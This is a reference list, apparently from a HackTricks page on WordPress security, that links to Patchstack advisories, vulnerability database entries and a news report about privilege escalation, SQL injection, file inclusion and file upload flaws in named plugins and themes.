- [ASE 7.6.3 changeset â€“ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments â‰¤ 5.6.1 â€“ Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation â€“ Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025â€™s most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) â‰¤ 1.0.82 â€“ Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations â‰¤ 3.5.3 â€“ Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider â‰¤ 3.6.1 â€“ Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder â‰¤ 2.5.1 â€“ Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)
- [Critical Arbitrary File Upload Vulnerability in Motors Theme Affecting 20k+ Sites](https://patchstack.com/articles/critical-arbitrary-file-upload-vulnerability-in-motors-theme-affecting-20k-sites/)

{{#include ../../banners/hacktricks-training.md}}
